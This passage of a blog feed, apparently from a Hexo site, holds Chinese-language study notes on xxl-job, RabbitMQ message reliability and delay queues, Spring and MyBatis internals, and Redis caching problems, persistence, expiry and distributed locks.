title="xxl-job路由策略"></p><hr><h4 id="xxl-job任务执行失败怎么解决？"><a href="#xxl-job任务执行失败怎么解决？" class="headerlink" title="xxl-job任务执行失败怎么解决？"></a>xxl-job任务执行失败怎么解决？</h4><p>故障转移+失败重试，查看日志分析—-&gt;邮件告警<br><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E8%B0%83%E5%BA%A6%E6%97%A5%E5%BF%97.png" title="调度日志"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6.png" title="邮件告警"></p><hr><h4 id="如果有大数据量的任务同时都需要执行，怎么解决？"><a href="#如果有大数据量的任务同时都需要执行，怎么解决？" class="headerlink" title="如果有大数据量的任务同时都需要执行，怎么解决？"></a>如果有大数据量的任务同时都需要执行，怎么解决？</h4><p>执行器集群部署时，任务路由策略选择<font color="#F00">分片广播</font>情况下，<font color="#F00">一次任务</font>调度将会广播触发对应集群中所有执行器执行一次任务</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E5%88%86%E7%89%87%E5%B9%BF%E6%92%AD.png" title="分片广播"></p><h2 id="消息中间件"><a href="#消息中间件" class="headerlink" title="消息中间件"></a>消息中间件</h2><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><h4 id="RabbitMQ如何保证消息不丢失"><a href="#RabbitMQ如何保证消息不丢失" class="headerlink" title="RabbitMQ如何保证消息不丢失"></a>RabbitMQ如何保证消息不丢失</h4><p>消息丢失有几种可能：<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%B6%88%E6%81%AF%E4%B8%A2%E5%A4%B1.png" title="消息丢失"></p><p><font color="#F00">生产者确认机制</font><br><br>RabbitMQ提供了publisher confirm机制来避免消息发送到MQ过程中丢失。消息发送到MQ以后，会返回一个结果给发送者，表示消息是否处理成功</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E7%94%9F%E4%BA%A7%E8%80%85%E7%A1%AE%E8%AE%A4%E6%9C%BA%E5%88%B6.png" title="生产者确认机制"></p><p>前两段失败会分别返回nack publish-confirm和ack publish-return</p><p>消息失败之后如何处理呢？<br>1、回调方法即时重发<br><br>2、记录日志<br><br>3、保存到数据库然后定时重发，成功发送后即刻删除表中的数据<br></p><p><font color="#F00">消息持久化</font><br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%B6%88%E6%81%AF%E6%8C%81%E4%B9%85%E5%8C%96.png" title="消息持久化"></p><p><font color="#F00">消费者确认</font><br></p><p>RabbitMQ支持消费者确认机制，即：消费者处理消息后可以向MQ发送ack回执，MQ收到ack回执后才会删除该消息。而SpringAMQP则允许配置三种确认模式：<br><br>1、manual：手动ack，需要在业务代码结束后，调用api发送ack。<br><br>2、auto：自动ack，由spring监测listener代码是否出现异常，没有异常则返回ack；抛出异常则返回nack<br><br>3、none：关闭ack，MQ假定消费者获取消息后会成功处理，因此消息投递后立即被删除<br><br>我们可以利用Spring的retry机制，在消费者出现异常时利用本地重试，设置重试次数，当次数达到了以后，如果消息依然失败，将消息投递到异常交换机，交由人工处理</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%B6%88%E8%B4%B9%E8%80%85%E7%A1%AE%E8%AE%A4%E6%9C%BA%E5%88%B6.png" title="消费者确认机制"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E4%B8%A2%E5%A4%B1%E7%9A%84%E6%96%B9%E6%B3%95.png" title="保证消息不丢失的方法"></p><hr><h4 id="RabbitMQ消息的重复消费问题"><a href="#RabbitMQ消息的重复消费问题" class="headerlink" title="RabbitMQ消息的重复消费问题"></a>RabbitMQ消息的重复消费问题</h4><p>RabbitMQ消息的重复消费问题主要是因为网络抖动、消费者挂了引起的</p><p>解决方法：<br><br><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%B6%88%E6%81%AF%E9%87%8D%E5%A4%8D%E6%B6%88%E8%B4%B9%E9%97%AE%E9%A2%98.png" title="消息重复消费问题"></p><hr><h4 id="RabbitMQ延迟队列"><a href="#RabbitMQ延迟队列" class="headerlink" title="RabbitMQ延迟队列"></a>RabbitMQ延迟队列</h4><p>延迟队列：进入队列的消息会被延迟消费的队列<br><br>场景：超时订单、限时优惠、定时发布</p><p><font color="#F00">延迟队列 &#x3D; 死信交换机 + TTL(生存时间)</font></p><p><font color="#F00">死信交换机</font></p><p>当一个队列中的消息满足下列情况之一时，可以成为<font color="#F00">死信(dea letter)</font><br><br>1、消费者使用basic.reject或basic.nack声明消费失败，并且消息的requeue参数设置为false<br><br>2、消息是一个过期消息，超时无人消费<br><br>3、要投递的队列消息堆积满了，最早的消息可能成为死信<br></p><p>如果该队列配置了dead-letter-exchange属性，指定了一个交换机，那么队列中的死信就会投递到这个交换机中，而这个交换机称为<font color="#F00">死信交换机(Dead Letter Exchange,简称DLX)</font></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%AD%BB%E4%BF%A1%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%A4%BA%E6%84%8F%E5%9B%BE.png" title="死信交换机"></p><p><font color="#F00">TTL</font></p><p>TTL，也就是Time-To-Live。如果一个队列中的消息TTL结束仍未消费，则会变为死信，ttl超分为两种情况：<br><br>1、消息所在的队列设置了存活时间<br><br>2、消息本身设置了存活时间<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/TTL.png" title="TTL"></p><p><font color="#F00">延迟队列插件</font></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E5%BB%B6%E8%BF%9F%E9%98%9F%E5%88%97%E6%8F%92%E4%BB%B6.png" title="延迟队列插件"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Delayexchange.png" title="Delayexchange"></p><hr><h4 id="消息堆积怎么解决"><a href="#消息堆积怎么解决" class="headerlink" title="消息堆积怎么解决"></a>消息堆积怎么解决</h4><p>当生产者发送消息的速度超过了消费者处理消息的速度，就会导致队列中的消息堆积，直到队列存储消息达到上限。之后发送的消息就会成为死信，可能会被丢弃，这就是消息堆积问题。</p><p>解决消息堆积有三种思路：<br><br>1、增加更多消费者，提高消费速度<br><br>2、在消费者内开启线程池加快消息处理速度<br><br>3、扩大队列容积，提高堆积上限<br></p><p><font color="#F00">惰性队列</font></p><p>惰性队列的特征如下：<br><br>1、接收到消息后直接存入磁盘而非内存<br><br>2、消费者要消费消息时才会从磁盘中读取并加载到内存<br><br>3、支持数百万条的消息存储</p><hr><h4 id="RabbitMQ的高可用机制"><a href="#RabbitMQ的高可用机制" class="headerlink" title="RabbitMQ的高可用机制"></a>RabbitMQ的高可用机制</h4><p>在生产环境下，使用集群来保证高可用性<br><br>普通集群、<font color="#F00">镜像集群、</font>仲裁队列<br></p><p><font color="#F00">普通集群</font></p><p>普通集群，或者叫标准集群(classic cluster)，具备下列特征：<br><br>1、会在集群的各个节点间共享部分数据，包括：交换机、队列元信息。不包括队列中的消息。<br><br>2、当访问集群某节点时，如果队列不在该节点，会从数据所在节点传递到当前节点并返回<br><br>3、队列所在节点宕机，队列中的消息就会丢失<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%99%AE%E9%80%9A%E9%9B%86%E7%BE%A4.png" title="普通集群"></p><p><font color="#F00">镜像集群</font></p><p>镜像集群：本质是主从模式，具备下面的特征：<br><br>1、交换机、队列、队列中的消息会在各个mq的镜像节点之间同步备份。<br><br>2、创建队列的节点被称为该队列的<strong>主节点</strong>，备份到的其它节点叫做该队列的<strong>镜像</strong>节点。<br><br>3、一个队列的主节点可能是另一个队列的镜像节点<br><br>4、所有操作都是主节点完成，然后同步给镜像节点<br><br>5、主宕机后，镜像节点会替代成新的主</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4.png" title="镜像集群"></p><p><font color="#F00">仲裁队列</font></p><p>仲裁队列：仲裁队列是3.8版本以后才有的新功能，用来替代镜像队列，具备下列特征：<br><br>1、与镜像队列一样，都是主从模式，支持主从数据同步<br><br>2、使用简单，没有复杂配置<br><br>3、主从同步基于Raft协议，强一致<br></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2025/02/22/Spring/"/>
    <url>/2025/02/22/Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p><img src="/2025/02/22/Spring/Spring%E9%87%8D%E7%82%B9.png" title="Spring重点"></p><h2 id="Spring-1"><a href="#Spring-1" class="headerlink" title="Spring"></a>Spring</h2><h3 id="bean线程安全问题"><a href="#bean线程安全问题" class="headerlink" title="bean线程安全问题"></a>bean线程安全问题</h3><p>bean不是线程安全的<br><br>Spring框架中有一个@Scope注解，默认的值就是singleton，单例的。<br><br>因为一般在spring的bean中的都是无状态的对象，没有线程安全问题，如果在bean中定义了可修改的成员变量，是要考虑线程安全问题的，可以使用多例或者加锁来解决。</p><h3 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h3><p>AOP称为面向切面编程，用于将那些与业务无关，但却对多个对象产生影响的公共行为和逻辑，抽取并封装为一个可重用的模块，这个模块被命名为“切面”(Aspect)，减少系统中的重复代码，降低了模块间的耦合度，同时提高了系统的可维护性。</p><p>常见的AOP使用场景：</p><p>1、记录操作日志<br><br>2、缓存处理<br><br>3、Spring中内置的事务处理</p><p><img src="/2025/02/22/Spring/%E8%AE%B0%E5%BD%95%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97.png" title="记录操作日志"></p><p><img src="/2025/02/22/Spring/%E8%AE%B0%E5%BD%95%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%80%9D%E8%B7%AF.png" title="记录操作日志思路"></p><p>Spring支持编程式事务管理和声明式事务管理两种方式。<br><br>1、编程式事务控制：需使用TransactionTemplate来进行实现，对业务代码有侵入性，项目中很少使用<br><br>2、声明式事务管理：声明式事务管理建立在AOP之上的。其本质是通过AOP功能，对方法前后进行拦截，将事务处理的功能编织到拦截的方法中，也就是在目标方法开始之前加入一个事务，在执行完目标方法之后根据执行情况提交或回滚事务。</p><hr><h3 id="事务失效"><a href="#事务失效" class="headerlink" title="事务失效"></a>事务失效</h3><p>情况一：异常捕获处理</p><p><img src="/2025/02/22/Spring/%E5%BC%82%E5%B8%B8%E6%8D%95%E8%8E%B7%E5%A4%84%E7%90%86.png" title="异常捕获处理"></p><p><strong>原因</strong>：事务通知只有捉到了目标抛出的异常，才能进行后续的回滚处理，如果目标自己处理掉异常，事务通知无法知悉。<br></p><p><strong>解决</strong>：在catch块添加throw new RuntimeException(e)抛出</p><hr>情况二：抛出检查异常<p><img src="/2025/02/22/Spring/%E6%8A%9B%E5%87%BA%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8.png" title="抛出检查异常"></p><p><strong>原因</strong>：Spring默认只会回滚非检查异常</p><p><strong>解决</strong>：配置rollbackFor属性  @Transaction(rollbackFor&#x3D;Exception.class)</p><hr><p>情况三：非public方法导致的事务失效</p><p><img src="/2025/02/22/Spring/%E9%9D%9Epublic%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4%E7%9A%84%E5%A4%B1%E6%95%88.png" title="非public方法导致的失效"></p><p><strong>原因</strong>：Spring为方法创建代理、添加事务通知、前提条件都是该方法是public的<br></p><p><strong>解决</strong>：改为public方法</p><hr><h3 id="bean的生命周期"><a href="#bean的生命周期" class="headerlink" title="bean的生命周期"></a>bean的生命周期</h3><p><font color="#F00">BeanDefinition</font><br><br>Spring容器在进行实例化时，会将xml配置的<bean>的信息封装成一个BeanDefinition对象，Spring根据BeanDefinition来创建Bean对象，里面有很多的属性用来描述Bean。</bean></p><p><img src="/2025/02/22/Spring/BeanDefinition.png" title="创建Bean"></p><p><font color="#F00">Bean的生命周期</font><br><img src="/2025/02/22/Spring/bean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" title="Bean的生命周期"></p><p>1、通过BeanDefinition获取bean的定义信息<br><br>2、调用构造函数实例化bean<br><br>3、bean的依赖注入<br><br>4、处理Aware接口(BeanNameAware、BeanFactoryAware、ApplicationContextAware)<br><br>5、Bean的后置处理器BeanPostProcessor-前置<br><br>6、初始化方法(InitializingBean、init-method)<br><br>7、Bean的后置处理器BeanPostProcessor-后置<br><br>8、销毁bean</p><hr><h3 id="Spring的循环引用"><a href="#Spring的循环引用" class="headerlink" title="Spring的循环引用"></a>Spring的循环引用</h3><p><strong>循环依赖</strong>：循环依赖其实就是循环引用，也就是两个或两个以上的bean互相持有对方，最终形成闭环。比如A依赖于B，B依赖于A。<br><br>循环依赖在Spring中是允许存在，Spring框架依据三级缓存已经解决了大部分的循环依赖<br></p><p><img src="/2025/02/22/Spring/Spring%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8.png" title="Spring循环引用"></p><p><img src="/2025/02/22/Spring/Spring%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96.png" title="Spring循环依赖"></p><p><font color="#F00">三级缓存解决循环依赖</font><br><br>Spring解决循环依赖是通过三级缓存，对应的三级缓存如下所示：<br></p><p><img src="/2025/02/22/Spring/%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98.png" title="三级缓存"></p><p>单独的一级缓存不能解决循环依赖问题</p><p><img src="/2025/02/22/Spring/%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98.png" title="一二级缓存"></p><p>如果是代理对象，一二级缓存就不能解决循环依赖问题</p><p><img src="/2025/02/22/Spring/%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96.png" title="三级缓存解决循环依赖"></p><p>构造方法出现了循环依赖</p><p><img src="/2025/02/22/Spring/%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E5%87%BA%E7%8E%B0%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96.png" title="构造方法出现循环依赖"></p><p><img src="/2025/02/22/Spring/%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.png" title="构造方法循环依赖解决方法"></p><h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><p>Springmvc的执行流程是这个框架最核心的内容<br><br>1、视图阶段(老旧JSP等)<br><br>2、前后端分离阶段(接口开发，异步)<br></p><p><font color="#F00">视图阶段(JSP)</font></p><p><img src="/2025/02/22/Spring/JSP.png" title="JSP"></p><p><img src="/2025/02/22/Spring/JSP%E7%AE%80%E5%8C%96.png" title="JSP简化"></p><p>SpringMVC的执行流程<br></p><p>视图版本JSP执行流程</p><p><img src="/2025/02/22/Spring/%E8%A7%86%E5%9B%BE%E7%89%88%E6%9C%ACJSP%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B.png" title="视图版本执行流程"></p><p>前后端开发，接口开发</p><p><img src="/2025/02/22/Spring/%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91.png" title="接口开发执行流程"></p><h2 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h2><h3 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h3><p><img src="/2025/02/22/Spring/%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86.png" title="自动配置原理"></p><p><img src="/2025/02/22/Spring/Spingboot%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86.png" title="Springboot自动配置原理"></p><hr><p><img src="/2025/02/22/Spring/Spring%E5%B8%B8%E8%A7%81%E6%B3%A8%E8%A7%A3.png" title="Spring常见注解"></p><p><img src="/2025/02/22/Spring/SpringMVC%E5%B8%B8%E8%A7%81%E6%B3%A8%E8%A7%A3.png" title="SpringMVC常见注解"></p><p><img src="/2025/02/22/Spring/Springboot%E5%B8%B8%E8%A7%81%E6%B3%A8%E8%A7%A3.png" title="Springboot常见注解"></p><h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><p><img src="/2025/02/22/Spring/Mybatis%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B.png" title="Mybatis执行流程"></p><p>1、读取Mybatis配置文件：mybatis-config.xml加载运行环境和映射文件<br>2、构造会话工厂SqlSessionFactory<br>3、会话工厂创建SqlSession对象(包含了执行SQL语句的所有方法)<br>4、操作数据库的接口，Executor执行器，同时负责查询缓存的维护<br>5、Executor接口的执行方法中有一个MappedStatement类型的参数，封装了映射信息<br>6、输入参数映射<br>7、输出结果映射</p><h2 id="Mybatis延迟加载"><a href="#Mybatis延迟加载" class="headerlink" title="Mybatis延迟加载"></a>Mybatis延迟加载</h2><p><img src="/2025/02/22/Spring/%E7%94%A8%E6%88%B7%E8%AE%A2%E5%8D%95.png" title="用户订单"></p><p>查询用户的时候，把用户所属的订单数据也查询出来，这个是立即加载<br><br>查询用户的时候，暂时不查询订单数据，当需要订单的时候，再查询订单，这个就是延迟加载</p><p><img src="/2025/02/22/Spring/%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%8E%9F%E7%90%86.png" title="延迟加载的原理"></p><p>延迟加载的意思是：在需要用到数据时才进行加载，不需要用到数据时就不加载数据。<br><br>Mybatis支持一对一关联对象和一对多关联集合对象的延迟加载。<br><br>在Mybatis配置文件中，可以配置是否启用延迟加载lazyLoadingEnabled&#x3D;true|false，默认是关闭的</p><p>延迟加载的底层原理：<br><br>1、使用<font color="#F00">CGLIB</font>创建目标对象的代理对象<br><br>2、当调用目标方法时，进入拦截器invoke方法，发现目标方法是null值，执行sql查询<br><br>3、获取数据以后，调用set方法设置属性值，再继续查询目标方法，就有值了<br></p><h2 id="Mybatis一二级缓存"><a href="#Mybatis一二级缓存" class="headerlink" title="Mybatis一二级缓存"></a>Mybatis一二级缓存</h2><p><img src="/2025/02/22/Spring/Mybatis%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98.png" title="Mybatis一二级缓存"></p><p><strong>一级缓存</strong>：基于PerpetualCache的HashMap本地缓存，其存储作用域为Session，当Session进行flush或close之后，该Session中的所有Cache就将清空，默认打开一级缓存。</p><p><strong>二级缓存</strong>：二级缓存是基于namespace和mapper的作用域起作用的，不是依赖于SQL session，默认也是采用PerpetualCache，HashMap存储</p><p><img src="/2025/02/22/Spring/%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9.png" title="Mybatis二级缓存注意事项"></p><p><img src="/2025/02/22/Spring/%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E6%80%BB%E7%BB%93.png" title="Mybatis一二级缓存总结"></p><p>Mybatis二级缓存什么时候会清理缓存中的数据？<br></p><p>当某一个作用域(一级缓存Session&#x2F;二级缓存Namespaces)的进行了<font color="#F00">新增、修改、删除</font>操作后，默认该作用域下所有select中的缓存将被clear。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>redis</title>
    <link href="/2025/02/07/redis/"/>
    <url>/2025/02/07/redis/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p><img src="/2025/02/07/redis/%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF.png" title="Redis使用场景"></p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><h3 id="穿透"><a href="#穿透" class="headerlink" title="穿透"></a>穿透</h3><p>例：<br>一个get请求：api&#x2F;news&#x2F;getById&#x2F;1</p><p>正常的缓存流程如图所示<br><img src="/2025/02/07/redis/%E7%BC%93%E5%AD%98.png" title="缓存流程"></p><hr><p><strong>缓存穿透</strong>：查询一个<strong>不存在</strong>的数据，MySQL查询不到数据也不会直接写入缓存，就会导致每次请求都查数据库</p><p><strong>解决方案一</strong>：缓存空数据，查询返回的数据为空，仍把这个空结果进行缓存<br><img src="/2025/02/07/redis/%E7%A9%BF%E9%80%8F%E8%A7%A3%E5%86%B3%E4%B8%80.png" title="缓存解决方案一"></p><p><strong>优点</strong>：简单</p><p><strong>缺点</strong>：消耗内存，可能会发生不一致的问题</p><p><strong>解决方案二</strong>：布隆过滤器</p><p><strong>布隆过滤器</strong><br><br>**bitmap(位图)**：相当于是一个以<font color="#F00">(bit)位</font>为单位的数组，数组中每个单元只能存储二进制数<font color="#F00">0或1</font><br><br><strong>布隆过滤器作用</strong>：布隆过滤器可以用于检索一个元素是否在一个集合中<br></p><p><img src="/2025/02/07/redis/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8.png" title="布隆过滤器"></p><p><img src="/2025/02/07/redis/%E8%AF%AF%E5%88%A4.png" title="布隆过滤器误判"></p><p><strong>误判率</strong>：数组越小误判率就越大，数组越大误判率就越小，但同时带来了更多的内存消耗<br><br>比如设置误判率不大于5%<br></p><hr><p><img src="/2025/02/07/redis/%E7%A9%BF%E9%80%8F%E8%A7%A3%E5%86%B3%E4%BA%8C.png" title="穿透解决二"></p><p><strong>优点</strong>：内存占用较少，没有多余key<br><br><strong>缺点</strong>：实现复杂，存在误判</p><h3 id="击穿"><a href="#击穿" class="headerlink" title="击穿"></a>击穿</h3><p><strong>缓存击穿</strong>：给某一个key设置了过期时间，当key过期的时候，恰好这时间点对这个key有大量的并发请求过来，这些并发的请求可能会瞬间把DB压垮<br></p><p><img src="/2025/02/07/redis/%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF.png" title="缓存击穿"></p><p><strong>解决方案一</strong>：互斥锁<br><br><strong>解决方案二</strong>：逻辑过期<br></p><p><img src="/2025/02/07/redis/%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png" title="缓存击穿解决方案"></p><p>互斥锁可以保证数据的<strong>强一致性</strong>，但<strong>性能差</strong>。<br><br>逻辑过期保证<strong>高可用</strong>，<strong>性能好</strong>。<br></p><p>两者不分好坏，根据具体业务选择。比如涉及到钱相关的业务使用互斥锁，而业务注重用户体验使用逻辑过期。</p><hr><h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h3><p><strong>缓存雪崩</strong>：是指在同一时段大量的缓存key同时失效或者Redis服务宕机，导致大量请求到达数据库，带来巨大压力<br></p><p><img src="/2025/02/07/redis/%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9.png" title="缓存雪崩"></p><p><strong>解决方案一</strong>：如果是key大量过期，给不同的key的TTL添加随机值<br><br><strong>解决方案二</strong>：如果是Redis宕机，利用Redis集群提高服务的可用性 $\qquad$<font color="#F00">哨兵模式、集群模式</font><br><br><strong>解决方案三</strong>：给缓存业务添加降级限流策略 $\qquad$<font color="#F00">ngxin或Spring Cloud gateway</font><br><br><strong>解决方案四</strong>：给业务添加多级缓存 $\qquad$<font color="#F00">Guava或Caffeine</font><br></p><p>降级可作为系统的保底策略，适用于穿透、击穿、雪崩</p><hr><h2 id="双写一致性"><a href="#双写一致性" class="headerlink" title="双写一致性"></a>双写一致性</h2><p><strong>双写一致性</strong>：当修改了数据库的数据也要同时更新缓存的数据，缓存和数据库的数据要保持一致<br></p><p><img src="/2025/02/07/redis/%E5%8F%8C%E5%86%99%E4%B8%80%E8%87%B4%E6%80%A7.png" title="双写一致性"></p><p><strong>读操作</strong>：缓存命中，直接返回；缓存未命中查询数据库，写入缓存，设定超时时间<br><br><strong>写操作</strong>：延迟双删</p><p><img src="/2025/02/07/redis/%E5%BB%B6%E6%97%B6%E5%8F%8C%E5%88%A0.png" title="延时双删"></p><p><img src="/2025/02/07/redis/%E5%86%99%E6%93%8D%E4%BD%9C%E5%A4%B1%E8%B4%A5%E4%BE%8B%E5%AD%90.png" title="写操作失败例子"></p><p>不管是先删除缓存还是先修改数据库都可能出现脏数据，延时双删降低了脏数据的风险，但延时的时间不好把控，依然存在风险。</p><p><img src="/2025/02/07/redis/%E5%8F%8C%E5%86%99%E4%B8%80%E8%87%B4%E6%80%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E4%BA%8C.png" title="双写一致性解决方案二"></p><p>这种读写锁方案保证了强一致性，但性能低。业务中常用于要保证强一致的场景中。</p><p><img src="/2025/02/07/redis/%E5%BC%82%E6%AD%A5%E9%80%9A%E7%9F%A5.png" title="异步通知保证数据的一致性"></p><p><img src="/2025/02/07/redis/Canal%E7%9A%84%E5%BC%82%E6%AD%A5%E9%80%9A%E7%9F%A5.png" title="Canal的异步通知"></p><hr><h2 id="Redis持久化"><a href="#Redis持久化" class="headerlink" title="Redis持久化"></a>Redis持久化</h2><p>在Redis中提供了两种数据持久化的方式:1、RDB  2、AOF</p><p>RDB全称Redis Database Backup file(Redis数据备份文件)，也被叫做Redis数据快照。简单来说就是把内存中的所有数据都记录到磁盘中。当Redis实例故障重启后，从磁盘读取快照文件，恢复数据。</p><p><img src="/2025/02/07/redis/RDB.png" title="RDB"></p><p>RDB执行原理？<br>bgsave开始时会fork主进程得到子进程，子进程<font color="#F00">共享</font>主进程的内存数据。完成fork后读取内存数据并写入RDB文件。fork采用的时copy-on-write技术：<br><br>(1)当主进程执行读操作时，访问共享内存；<br><br>(2)当主进程执行写操作时，则会拷贝一份数据，执行写操作。</p><p><img src="/2025/02/07/redis/RDB%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86.png" title="RDB执行原理"></p><p><img src="/2025/02/07/redis/fork%E7%AD%96%E7%95%A5.png" title="fork策略"></p><p>AOF全称为Append Only File(追加文件)。Redis处理的每一个写命令都会记录在AOF文件，可以看做是命令日志文件。</p><p><img src="/2025/02/07/redis/AOF%E9%85%8D%E7%BD%AE.png" title="AOF配置"></p><p>因为是记录命令，AOF文件会比RDB文件大得多。而且AOF会记录对同一个key的多次写操作，但只有最后一次写操作才有意义。通过执行<font color="#F00">bgrewriteaof</font>命令，可以让AOF文件执行重写功能，用最少的命令达到相同的效果。</p><p><img src="/2025/02/07/redis/bgrewirte.png" title="bgrewrite命令"></p><p><img src="/2025/02/07/redis/%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E6%B3%95%E5%AF%B9%E6%AF%94.png" title="优缺点对比"></p><h2 id="数据过期策略"><a href="#数据过期策略" class="headerlink" title="数据过期策略"></a>数据过期策略</h2><p>Redis对数据设置数据的有效时间，数据过期以后，就需要将数据从内存中删除。可以按照不同的规则进行删除，这种删除规则就被称之为数据的删除策略(数据过期策略)。<font color="#F00">惰性删除、定期删除</font><br></p><p><strong>惰性删除</strong>：设置该key过期时间后，我们不去管它，当需要该key时，我们在检查其是否过期，如果过期，我们就删除它，反之返回该key</p><p><strong>优点</strong>：对cpu友好，只会在使用该key时才会进行过期检查，对于很多用不到的key不用浪费时间进行过期检查<br><br><strong>缺点</strong>：对内存不友好，如果一个key已经过期，但是一直没有使用，那么该key就会一直存在内存中，内存永远不会释放<br></p><p><strong>定期删除</strong>：每隔一段时间，我们就对一些key进行检查，删除里面过期的key(从一定数量的数据库中取出一定数量的随机key进行检查，并删除其中的过期key)。<br></p><p><img src="/2025/02/07/redis/%E5%AE%9A%E6%9C%9F%E6%B8%85%E7%90%86%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F.png" title="定期清理两种模式"></p><p><strong>优点</strong>：可以通过限制删除操作执行的时长和频率来减少删除操作对CPU的影响。另外定期删除，也能有效释放过期键占用的内存。<br><br><strong>缺点</strong>：难以确定删除操作执行的时长和频率。<br></p><p>Redis的过期删除策略：<font color="#F00">惰性删除 + 定期删除</font>两种策略进行配合使用</p><h2 id="数据淘汰策略"><a href="#数据淘汰策略" class="headerlink" title="数据淘汰策略"></a>数据淘汰策略</h2><p><strong>数据淘汰策略</strong>：当Redis中的内存不够用时，此时在向Redis中添加新的key，那么Redis就会按照某一种规则将内存中的数据删除掉，这种数据的删除规则被称之为内存的淘汰策略。<br><br>Redis支持8种不同策略来选择要删除的key：</p><p><img src="/2025/02/07/redis/8%E7%A7%8D%E7%AD%96%E7%95%A5.png" title="8种策略"></p><p><font color="#F00">数据淘汰策略-使用建议</font><br></p><p><img src="/2025/02/07/redis/%E6%B7%98%E6%B1%B0%E7%AD%96%E7%95%A5%E4%BD%BF%E7%94%A8%E5%BB%BA%E8%AE%AE.png" title="淘汰策略使用建议"></p><h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>分布式锁的使用场景：集群情况下的定时任务、抢单、幂等性场景<br></p><p><img src="/2025/02/07/redis/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81.png" title="分布式锁"></p><p>Redis实现分布式锁主要利用Redis的<font color="#F00">setnx</font>命令。setnx是SET if not exist(如果不存在，则SET)的简写。<br></p><p><img 